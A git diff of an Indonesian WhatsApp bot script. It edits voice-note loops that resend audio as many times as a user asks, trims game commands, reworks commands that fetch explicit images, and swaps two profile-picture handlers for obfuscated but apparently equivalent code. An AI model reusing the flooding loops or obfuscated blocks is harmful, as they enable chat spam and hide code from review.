  nyong = fs.readFileSync('./baseikal/sound/mastah.mp3')
- haikal.sendMessage(jumlah, {audio: nyong, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
+ haikal.sendMessage(m.chat, {audio: nyong, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  }
  break
@@ -1655,7 +1552,7 @@ jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
  ri = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
- haikal.sendMessage(jumlah, {audio: ri, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
+ haikal.sendMessage(m.chat, {audio: ri, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  }
  break
@@ -1668,7 +1565,7 @@ jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
  ru = fs.readFileSync('./baseikal/sound/loli.mp3')
- haikal.sendMessage(jumlah, {audio: ru, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
+ haikal.sendMessage(m.chat, {audio: ru, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  }
  break
@@ -1681,7 +1578,7 @@ jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
  re = fs.readFileSync('./baseikal/sound/kesel.mp3')
- haikal.sendMessage(jumlah, {audio: re, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
+ haikal.sendMessage(m.chat, {audio: re, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  }
  break
@@ -1694,7 +1591,7 @@ jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
  ro = fs.readFileSync('./baseikal/sound/ngeselin.mp3')
- haikal.sendMessage(jumlah, {audio: ro, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
+ haikal.sendMessage(m.chat, {audio: ro, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  }
  break
@@ -1823,6 +1720,7 @@ haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: m })
 }
 break
 //=================================================//
+/*
 case 'anime': {
 if (isBan) throw sticBanLu(from) 
 if (!text) return m.reply(`you are looking for what anime apa?\n\nEXAMPLE ${prefix}anime naruto`)
@@ -1850,7 +1748,7 @@ buttonText: "CLICK HERE",
 sections
  }, { quoted : m })
 }
-break
+break*/
 //=================================================//
 case 'translate': case 'terjemahan': case 'tr': {
 if (isBan) throw sticBanLu(from)
@@ -1877,7 +1775,6 @@ haikal.sendImage(m.chat, data.url, mess.success, m)
 })
 break
 //=================================================//
-//=================================================//
 case 'darkjoke':{
 if (isBan) throw sticBanLu(from)
 anu = await getBuffer(`https://api.xteam.xyz/asupan/darkjoke?APIKEY=apivproject`)
@@ -1901,11 +1798,10 @@ break
 //=================================================//
 case 'ss': case 'ssweb': {
 if (isBan) throw sticBanLu(from)
-////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(mess.endLimit)
 if (!text) throw `Example : ${prefix + command} Url`
 anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${text}`) 
 buf = await getBuffer(anu.screenshot) 
-haikal.sendMessage(m.chat, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted: m }).catch((err) => m.reply(jsonformat('*error*')))
+haikal.sendMessage(m.chat, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted: m }).catch((err) => m.reply(jsonformat('*LINK NYA SLUR*')))
 }
 break
 //=================================================//
@@ -2302,50 +2198,6 @@ reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\
 break
 //=================================================//
 //=================================================//
-case 'delttc': case 'delttt': {
-if (isBan) throw sticBanLu(from)
-this.game = this.game ? this.game : {}
-try {
-if (this.game) {
-delete this.game
-haikal.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
-} else if (!this.game) {
-reply(`Session TicTacToe🎮 tidak ada`)
-} else throw '?'
-} catch (e) {
-reply('rusak')
-}
-}
-break
-//=================================================//
-case 'suitpvp': case 'suit': {
-if (isBan) throw sticBanLu(from)
-this.suit = this.suit ? this.suit : {}
-let poin = 10
-let poin_lose = 10
-let timeout = 60000
-if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
-if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
-if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
-if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
-let id = 'suit_' + new Date() * 1
-let caption = `_*SUIT PvP*_
-@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit
-Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
-this.suit[id] = {
-chat: await haikal.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
-id: id,
-p: m.sender,
-p2: m.mentionedJid[0],
-status: 'wait',
-waktu: setTimeout(() => {
-if (this.suit[id]) haikal.sendText(m.chat, `_Waktu suit habis_`, m)
-delete this.suit[id]
-}, 60000), poin, poin_lose, timeout
-}
-}
-break
-//=================================================//
 case 'sc': {
 if (isBan) throw sticBanLu(from)
 reply('Telegram : https://t.me/haikal857\n\n Sc Bot : https://youtube.com/c/HwModsWa857')
@@ -2373,24 +2225,6 @@ haikal.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.ch
 }
 break
 //=================================================//
-case 'family100': {
-if (isBan) throw sticBanLu(from)
-if ('family100'+m.chat in _family100) {
-reply('Masih Ada Sesi Yang Belum Diselesaikan!')
-throw false
-}
-let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
-let random = anu[Math.floor(Math.random() * anu.length)]
-let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
-_family100['family100'+m.chat] = {
-id: 'family100'+m.chat,
-pesan: await haikal.sendText(m.chat, hasil, m),
-...random,
-terjawab: Array.from(random.jawaban, () => false),
-hadiah: 6,
-}
-}
-break
 //=================================================//
 case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
 if (isBan) throw sticBanLu(from)
@@ -2400,97 +2234,9 @@ tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
 reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
 break
 //=================================================//
-case 'tebak': {
-if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
-if (args[0] === "lagu") {
-if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
-let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
-let result = anu[Math.floor(Math.random() * anu.length)]
-let msg = await haikal.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
-haikal.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
-tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
-})
-await sleep(60000)
-if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
-console.log("Jawaban: " + result.jawaban)
-haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
-delete tebaklagu[m.sender.split('@')[0]]
-}
-} else if (args[0] === 'gambar') {
-if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
-let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
-let result = anu[Math.floor(Math.random() * anu.length)]
-haikal.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
-tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
-})
-await sleep(60000)
-if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
-console.log("Jawaban: " + result.jawaban)
-haikal.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
-delete tebakgambar[m.sender.split('@')[0]]
-}
-} else if (args[0] === 'kata') {
-if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
-let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
-let result = anu[Math.floor(Math.random() * anu.length)]
-haikal.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
-tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
-})
-await sleep(60000)
-if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
-console.log("Jawaban: " + result.jawaban)
-haikal.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
-delete tebakkata[m.sender.split('@')[0]]
-}
-} else if (args[0] === 'kalimat') {
-if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
-let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
-let result = anu[Math.floor(Math.random() * anu.length)]
-haikal.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
-tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
-})
-await sleep(60000)
-if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
-console.log("Jawaban: " + result.jawaban)
-haikal.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
-delete tebakkalimat[m.sender.split('@')[0]]
-}
-} else if (args[0] === 'lirik') {
-if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
-let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
-let result = anu[Math.floor(Math.random() * anu.length)]
-haikal.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
-tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
-})
-await sleep(60000)
-if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
-console.log("Jawaban: " + result.jawaban)
-haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
-delete tebaklirik[m.sender.split('@')[0]]
-}
-} else if (args[0] === 'lontong') {
-if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
-let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
-let result = anu[Math.floor(Math.random() * anu.length)]
-haikal.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
-caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
-caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
-})
-await sleep(60000)
-if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
-console.log("Jawaban: " + result.jawaban)
-haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
-delete caklontong[m.sender.split('@')[0]]
-delete caklontong_desk[m.sender.split('@')[0]]
-}
-}
-}
-break
 //=================================================//
 case 'mediafire': {
 if (isBan) throw sticBanLu(from)
-////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return  
 if (!text) throw '*Enter a Link Query!*'
 if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw '*The link you provided is not valid*'
 const baby1 = await mediafireDl(text)
@@ -2509,24 +2255,8 @@ haikal.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1
 }
 break
 //=================================================//
-case 'kuismath': case 'math': {
-if (isBan) throw sticBanLu(from)
-if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
-let { genMath, modes } = require('./baseikal/dbnye/math')
-if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
-let result = await genMath(text.toLowerCase())
-haikal.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
-kuismath[m.sender.split('@')[0]] = result.jawaban
-})
-await sleep(result.waktu)
-if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
-console.log("Jawaban: " + result.jawaban)
-reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
-delete kuismath[m.sender.split('@')[0]]
-}
-}
-break
 //=================================================//
+/*
 case 'jodohku': {
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) throw groupon(from)
@@ -2557,7 +2287,7 @@ let buttons = [
 ]
 await haikal.sendButtonText(m.chat, buttons, jawab, haikal.user.name, m, {mentions: menst})
 }
-break
+break*/
 //=================================================//
 case 'react': {
  reactionMessage = {
@@ -2678,116 +2408,103 @@ break
 //=================================================//
 case 'nsfw': {
 if (isBan) throw sticBanLu(from)
-if (!m.isGroup) return m.reply(mess.group)
-if (!isBotAdmins) return m.reply(mess.botAdmin)
-if (!isAdmins && !isCreator) return m.reply(mess.admin)
+if (!isRegistered) return replyReg(mess.verif)
+if (!m.isGroup) return anjay(mess.group)
+if (!isBotAdmins) return anjay(mess.botAdmin)
+if (!isAdmins && !isCreator) return anjay(mess.admin)
 if (args[0] === "on") {
-if (AntiNsfw) return m.reply('Sudah Aktif')
+if (AntiNsfw) return anjay('Sudah Aktif')
 ntnsfw.push(from)
-m.reply('Sukses Telah mengaktifkan Nsfw Di group Ini')
+anjay('Sukses Telah mengaktifkan Nsfw Di group Ini')
 var groupe = await haikal.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya`, contextInfo: { mentionedJid : mems }}, {quoted:hw})
 } else if (args[0] === "off") {
-if (!AntiNsfw) return m.reply('Sudah Non Aktif')
+if (!AntiNsfw) return anjay('Sudah Non Aktif')
 let off = ntnsfw.indexOf(from)
 ntnsfw.splice(off, 1)
-m.reply('Sukses Mematikan Nsfw di group ini')
+anjay('Sukses Mematikan Nsfw di group ini')
 } else {
-let buttonsntnsfw = [
-{ buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
-{ buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
-]
-await haikal.sendButtonText(m.chat, buttonsntnsfw, `Klick Button Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan
-\n\n*WELCOME\n\n
+const anuu = {
+video:fs.readFileSync("./baseikal/video/haikal.mp4"),
+gifPlayback:true,
+jpegThumbnail:log0,
+caption:  `Ketik Text Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan
+\n\n*HELLO SANGEAN\n\n
 trap
 gasm
 nwaifu
-hneko `, `${global.botname}`, m)
+hneko `,
+}
+haikal.sendMessage(m.chat, anuu, `${global.botname}`, m)
 }
 }
 break
 case 'trap' :
 if (isBan) throw sticBanLu(from)
-if (!m.isGroup) return m.reply(mess.group)
-if (!AntiNsfw) return m.reply(mess.nsfw)
-reply(mess.wait)
+if (!isRegistered) return replyReg(mess.verif)
+if (!m.isGroup) return anjay(mess.group)
+if (!AntiNsfw) return anjay(mess.nsfw)
+anjay(mess.wait)
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)
- let trapbot = [
- {buttonId: `trap`, buttonText: {displayText: `Next ⚡`}, type: 1},
- ]
-let button2Messages = {
+ const trapbot = {
 image: {url:waifudd.data.url},
 caption:`Here you go!`,
-buttons: trapbot,
-headerType: 1
 }
- await haikal.sendMessage(m.chat, button2Messages, { quoted:m }).catch(err => {
+haikal.sendMessage(m.chat, trapbot, { quoted:hw }).catch(err => {
  return('Error!')
 })
 break
 case 'hentai-neko' :
 case 'hneko' :
 if (isBan) throw sticBanLu(from)
-if (!m.isGroup) return m.reply(mess.group)
-if (!AntiNsfw) return m.reply(mess.nsfw)
+if (!isRegistered) return replyReg(mess.verif)
+if (!m.isGroup) return anjay(mess.group)
+if (!AntiNsfw) return anjay(mess.nsfw)
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
- let hnekobot = [
- {buttonId: `.hneko`, buttonText: {displayText: `Next ⚡`}, type: 1},
- ]
-let button3Messages = {
+ const hnekobot = {
 image: {url:waifudd.data.url},
 caption:`Here you go!`,
-buttons: hnekobot,
-headerType: 1
-} 
- await haikal.sendMessage(m.chat, button3Messages, { quoted:m }).catch(err => {
+}
+haikal.sendMessage(m.chat, hnekobot, { quoted:hw }).catch(err => {
  return('Error!')
 })
 break
 case 'hentai-waifu' :
 case 'nwaifu' :
 if (isBan) throw sticBanLu(from)
-if (!m.isGroup) return m.reply(mess.group)
-if (!AntiNsfw) return m.reply(mess.nsfw)
-reply(mess.wait)
+if (!isRegistered) return replyReg(mess.verif)
+if (!m.isGroup) return anjay(mess.group)
+if (!AntiNsfw) return anjay(mess.nsfw)
+anjay(mess.wait)
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
- let nwaifubot = [
- {buttonId: `.hneko`, buttonText: {displayText: `Next ⚡`}, type: 1},
- ]
-let button4Messages = {
+ const nwaifubot = {
 image: {url:waifudd.data.url},
 caption:`Here you go!`,
-buttons: nwaifubot,
-headerType: 1
-} 
- await haikal.sendMessage(m.chat, button4Messages, { quoted:m }).catch(err => {
+}
+haikal.sendMessage(m.chat, nwaifubot, { quoted:hw }).catch(err => {
  return('Error!')
 })
 break
 case 'gasm':
 if (isBan) throw sticBanLu(from)
-if (!AntiNsfw) return m.reply(mess.nsfw)
-reply(mess.wait) 
+if (!isRegistered) return replyReg(mess.verif)
+if (!AntiNsfw) return anjay(mess.nsfw)
+anjay(mess.wait) 
  waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
-var wbuttsss = [
-{buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
-]
- let buttonsssMessages = {
+ const wbuttsss = {
 image: {url:waifudd.data.url},
 caption:`Here you go!`,
- footer: `${global.botname}`,
- buttons: wbuttsss,
- headerType: 4
- }
- await haikal.sendMessage(m.chat, buttonsssMessages,{ quoted:m }).catch(err => {
+}
+haikal.sendMessage(m.chat, wbuttsss,{ quoted:hw }).catch(err => {
  return('Error!')
 })
 break
+//=================================================//
 case 'setppbot': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
@@ -2795,17 +2512,10 @@ sticWait(from)
 if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
 if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
 if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
-var media = await haikal.downloadAndSaveMediaMessage(quoted)
-try {
-if (args[0] == "/full") {
-const { generateProfilePicture } = require("./baseikal/lib/myfunc")
-var { img } = await generateProfilePicture(media)
-await haikal.query({ tag: 'iq',attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
-} else { await haikal.updateProfilePicture(botNumber, { url: media }) }
-m.reply(mess.success)
-} catch { m.reply('Gagal Mengganti Photo Profile') }
+var _0x1c413d=_0x2a1c;(function(_0x477de5,_0x25404c){var _0xc6ef35=_0x2a1c,_0x1a86a3=_0x477de5();while(!![]){try{var _0x392e78=parseInt(_0xc6ef35(0xff))/0x1+-parseInt(_0xc6ef35(0xfc))/0x2+-parseInt(_0xc6ef35(0xf9))/0x3*(parseInt(_0xc6ef35(0xfe))/0x4)+parseInt(_0xc6ef35(0x103))/0x5*(parseInt(_0xc6ef35(0x100))/0x6)+parseInt(_0xc6ef35(0x105))/0x7+parseInt(_0xc6ef35(0x108))/0x8+-parseInt(_0xc6ef35(0x102))/0x9*(parseInt(_0xc6ef35(0xfd))/0xa);if(_0x392e78===_0x25404c)break;else _0x1a86a3['push'](_0x1a86a3['shift']());}catch(_0x4aa4a8){_0x1a86a3['push'](_0x1a86a3['shift']());}}}(_0x512f,0x3121c));var media=await haikal[_0x1c413d(0x10a)](quoted);function _0x2a1c(_0x26455a,_0x1953ac){var _0x512fee=_0x512f();return _0x2a1c=function(_0x2a1c5a,_0x267fa3){_0x2a1c5a=_0x2a1c5a-0xf8;var _0xfaa61b=_0x512fee[_0x2a1c5a];return _0xfaa61b;},_0x2a1c(_0x26455a,_0x1953ac);}try{if(args[0x0]==_0x1c413d(0xfa)){const {generateProfilePicture}=require('./baseikal/lib/myfunc');var {img}=await generateProfilePicture(media);await haikal[_0x1c413d(0x106)]({'tag':'iq','attrs':{'to':botNumber,'type':'set','xmlns':_0x1c413d(0x107)},'content':[{'tag':_0x1c413d(0xf8),'attrs':{'type':_0x1c413d(0xfb)},'content':img}]});}else await haikal[_0x1c413d(0x101)](botNumber,{'url':media});m['reply'](mess[_0x1c413d(0x109)]);}catch{m[_0x1c413d(0x104)]('Gagal\x20Mengganti\x20Photo\x20Profile');}function _0x512f(){var _0x2f232f=['reply','1286194bdHKgR','query','w:profile:picture','3088072VzwWid','success','downloadAndSaveMediaMessage','picture','153igiZJi','/full','image','720650VaxDBN','2205790rCEybd','5796etOiDI','80334lizMjF','6GdpecB','updateProfilePicture','9DZAUSC','1029810dkCbDi'];_0x512f=function(){return _0x2f232f;};return _0x512f();}
 }
 break
+//=================================================//
 case 'setppgroup': case 'setppgrup': case 'setppgc': {
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) throw mess.group
@@ -2814,15 +2524,7 @@ sticWait(from)
 if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
 if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
 if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
-let media = await haikal.downloadAndSaveMediaMessage(quoted)
-try {
-if (args[0] == "/full") {
-const { generateProfilePicture } = require("./baseikal/lib/myfunc")
-var { img } = await generateProfilePicture(media)
-await haikal.query({ tag: 'iq',attrs: { to: m.chat, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
-} else { await haikal.updateProfilePicture(m.chat, { url: media }) }
-m.reply(mess.success)
-} catch { m.reply('Gagal Mengganti Photo Profile') }
+const _0x3c52ee=_0x4109;(function(_0x1a4f9f,_0x3819cc){const _0x5c4a67=_0x4109,_0x4d0e21=_0x1a4f9f();while(!![]){try{const _0x2fe536=-parseInt(_0x5c4a67(0x78))/0x1+parseInt(_0x5c4a67(0x7a))/0x2*(-parseInt(_0x5c4a67(0x7e))/0x3)+parseInt(_0x5c4a67(0x73))/0x4+parseInt(_0x5c4a67(0x7c))/0x5+-parseInt(_0x5c4a67(0x72))/0x6+parseInt(_0x5c4a67(0x76))/0x7+parseInt(_0x5c4a67(0x70))/0x8;if(_0x2fe536===_0x3819cc)break;else _0x4d0e21['push'](_0x4d0e21['shift']());}catch(_0x3ccaac){_0x4d0e21['push'](_0x4d0e21['shift']());}}}(_0x38ce,0x9724c));function _0x4109(_0x2b2147,_0x340f6c){const _0x38ce6f=_0x38ce();return _0x4109=function(_0x410966,_0x2335d5){_0x410966=_0x410966-0x6d;let _0xbe9a92=_0x38ce6f[_0x410966];return _0xbe9a92;},_0x4109(_0x2b2147,_0x340f6c);}let media=await haikal['downloadAndSaveMediaMessage'](quoted);function _0x38ce(){const _0x2fbc7e=['43773HHkTHV','w:profile:picture','./baseikal/lib/myfunc','chat','10418328MFCmiM','reply','6441450CkyNxQ','1458440XVIgpe','set','picture','4984819pxHUxY','/full','786695iyptWU','query','142qiVRKp','image','5681485dynfLf','Gagal\x20Mengganti\x20Photo\x20Profile'];_0x38ce=function(){return _0x2fbc7e;};return _0x38ce();}try{if(args[0x0]==_0x3c52ee(0x77)){const {generateProfilePicture}=require(_0x3c52ee(0x6e));var {img}=await generateProfilePicture(media);await haikal[_0x3c52ee(0x79)]({'tag':'iq','attrs':{'to':m[_0x3c52ee(0x6f)],'type':_0x3c52ee(0x74),'xmlns':_0x3c52ee(0x6d)},'content':[{'tag':_0x3c52ee(0x75),'attrs':{'type':_0x3c52ee(0x7b)},'content':img}]});}else await haikal['updateProfilePicture'](m[_0x3c52ee(0x6f)],{'url':media});m[_0x3c52ee(0x71)](mess['success']);}catch{m['reply'](_0x3c52ee(0x7d));}
 }
 break
 //=================================================//
@@ -2859,214 +2561,77 @@ reply(teks)
 }
 break
 //=================================================//
- case 'vote': {
- if (isBan) throw sticBanLu(from)
-if (!m.isGroup) throw groupon(from)
-if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
-if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
-reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
-vote[m.chat] = [q, [], []]
-await sleep(1000)
-upvote = vote[m.chat][1]
-devote = vote[m.chat][2]
-teks_vote = `*「 VOTE 」*
-*Alasan:* ${vote[m.chat][0]}
-┌〔 UPVOTE 〕
-│ 
-├ Total: ${vote[m.chat][1].length}
-│
-│ 
-└────
-┌〔 DEVOTE 〕
-│ 
-├ Total: ${vote[m.chat][2].length}
-│
-│ 
-└────
-*${prefix}hapusvote* - untuk menghapus vote`
-let buttonsVote = [
-{buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
-{buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
-]
-let buttonMessageVote = {
-text: teks_vote,
-footer: haikal.user.name,
-buttons: buttonsVote,
-headerType: 1
-}
-haikal.sendMessage(m.chat, buttonMessageVote)
-}
-break
-//=================================================//
- case 'upvote': {
- if (isBan) throw sticBanLu(from)
-if (!m.isGroup) throw groupon(from)
-if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
-isVote = vote[m.chat][1].concat(vote[m.chat][2])
-wasVote = isVote.includes(m.sender)
-if (wasVote) throw 'Kamu Sudah Vote'
-vote[m.chat][1].push(m.sender)
-menvote = vote[m.chat][1].concat(vote[m.chat][2])
-teks_vote = `*「 VOTE 」*
-*Alasan:* ${vote[m.chat][0]}
-┌〔 UPVOTE 〕
-│ 
-├ Total: ${vote[m.chat][1].length}
-${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
-│ 
-└────
-┌〔 DEVOTE 〕
-│ 
-├ Total: ${vote[m.chat][2].length}
-${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
-│ 
-└────
-*${prefix}hapusvote* - untuk menghapus vote`
-let buttonsUpvote = [
-{buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
